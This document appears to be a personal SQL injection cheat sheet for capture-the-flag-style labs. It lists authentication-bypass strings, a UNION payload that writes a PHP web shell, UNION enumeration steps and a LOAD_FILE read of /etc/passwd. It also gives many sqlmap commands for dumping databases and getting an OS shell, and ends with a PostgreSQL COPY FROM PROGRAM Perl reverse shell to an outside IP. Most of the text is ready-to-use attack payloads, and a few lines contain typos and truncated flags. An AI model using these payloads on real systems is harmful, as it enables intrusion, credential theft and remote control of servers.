# Normal everyday 

* ' or 1=1 --
* 1' or 1=1 --+
* ') or 1=1 --+

# inject shell

* param' uninon select "<?php SYSTEM($_REQUEST['cmd']) ?> INTO OUTFILE '/var/www/html/shell.php'-- - (when it outputs one)

# Blind Sql inject

* Error not shown
* substr((select database()),1,1)) = 115

# Union SQLInjec

UNION SQLi is mainly used for fast database enumeration, as the UNION operator allows you to combine results of multiple SELECT statements at a time.

UNION SQLi attack consists of 3 stages:

    Finding the number of columns
    Checking if the columns are suitable
    Attack and get some interesting data.

' ORDER BY 1--

' ORDER BY 2--

' ORDER BY 3--

* and so on until an error occur

' UNION SELECT NULL--

' UNION SELECT NULL,NULL--

' UNION SELECT NULL,NULL,NULL--

* until the error occurs
No error = number of NULL matches the number of columns.


    Finding columns with a useful data type in an SQL injection UNION attack

Generally, the interesting data that you want to retrieve will be in string form. Having already determined the number of required columns, (for example 4) you can probe each column to test whether it can hold string data by replacing one of the UNION SELECT payloads with a string value. In case of 4 you would submit:

' UNION SELECT 'a',NULL,NULL,NULL--

' UNION SELECT NULL,'a',NULL,NULL--

' UNION SELECT NULL,NULL,'a',NULL--

' UNION SELECT NULL,NULL,NULL,'a'--

No error = data type is useful for us (string).


#    Using an SQL injection UNION attack to retrieve interesting data

When you have determined the number of columns and found which columns can hold string data, you can finally start retrieving interesting data.

Suppose that:

    The first two steps showed exactly two existing columns with useful datatype.
    The database contains a table called users with the columns username and password.

In this situation, you can retrieve the contents of the user's table by submitting the input:

' UNION SELECT username, password FROM users --

Here's a small list of thing you'd want to retrieve:

    database()
    user()
    @@version
    username
    password
    table_name
    column_name

# Sqlite

* Select * from sqlite_master => get table names then use values to pull data

# sql-mAP
SQLMap is an open source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over of database servers. It's an incredible tool that can be learned within minutes. It's already included in THM's AttackBox or you can install it locally by running:

git clone --depth 1 <https://github.com/sqlmapproject/sqlmap.git> sqlmap-dev

Here are some of the most common options that you would configure when using SQLMap
Command 	
--url 	Provide URL for the attack
--dbms 	Tell SQLMap the type of database that is running
--dump 	Dump the data within the database that the application uses
--dump-all 	Dump the ENTIRE database
--batch 	SQLMap will run automatically and won't ask for user input

Let's show an example of an SQLMap command. Let's say we have a vulnerable login form located at "http://tbfc.net/login.php". (Note, this is just an example, please do not SQLMap this website as no consent has been given by the owner.) We would use this alongside `--url` to tell SQLMap where to attack. i.e. s`qlmap --url http://tbfc.net/login.php`

Where we can then proceed to enumerate what data is in the application's database with options such as --tables and -columns. Leaving our final SQLMap looking like so: sqlmap --url http://tbfc.net/login.php --tables --columns

Again, tbfc.net is given as example, please do not perform any attack on this site. `https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet`

# exfiltool fro image analysis

# Syntax
* use wireshark to capture the interface (eth0,tun0 etc)
* print(bytes.fromhex('hexdigit')) --> intractive consle
* sqlmap -u 'http://IP:81/ping?id=1' --batch --dbs -> show databases
* admin' UNION ALL SELECT 0,LOAD_FILE('/etc/passwd'),2,3,4,5; --

* sqlmap -u http://web.webform.com --form --batch

* sqlmap -u http://web.webform.com --form --batch --os-shell

* sqlmap -u 'http://IP:81/ping?id=1' --batch -D <databasename> --dump-all -> dumps

* sqlmap http://ip/page/vul -d "user_input='')"

* sqlmap http://ip/page/vul --data "user_input=1" -p "user_input" --method POST --dbms=mysql

* sqlmap http://ip/page/vul --data "user_input=1" -p "user_input" --method POST --dbms=mysql -dbs -> dump db names

* sqlmap http://ip/page/vul --data "user_input=1" -p "user_input" --method POST --dbms=mysql -D flag --dump

`sqlmap -r sql.request --tamper=space2comment --dump-all --dbms sqlite`

* .request file is gotten from save raw request from burp

* sqlmap -r filename -p id|param --not-string ridiculous|common word --batch

* sqlmap -r filename -p id|param --not-string ridiculous|common word --batch -D neddy|db --tables --threads 10

* sqlmap -r filename --level=5 --risk=3 

* sqlmap -r filename --level=5 --risk=3 --batch ***

* sqlmap -r filename -dbs --level=5 --risk=3 --batch

* sqlmap -r filename -dbs --random-agent --thread 10 --batch | test

* sqlmap -r filename -D level2 --tables --random-agent --thread 10 --batch

* sqlmap -r filename -D level2 -T `admins` --dump --random-agent --thread 10 --batch

*   'SELECT   name,   type   FROM   USERS   WHERE   name   LIKE   "%'   +   query   +   '%";' 

* 1";   SELECT   *   FROM   USERS   WHERE   "%"=" 

*  SELECT name, type FROM USERS WHERE name LIKE "%1"; SELECT * FROM USERS WHERE "%"="%";

* sqlmap.py -r ping.req -p id --risk 3 --level 5 --b[29/29] -threads 10 -D networkmonitor -T host --dump 


# Notes

* create userlist

# Postgressql Command exec

`COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.88.7.42:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';`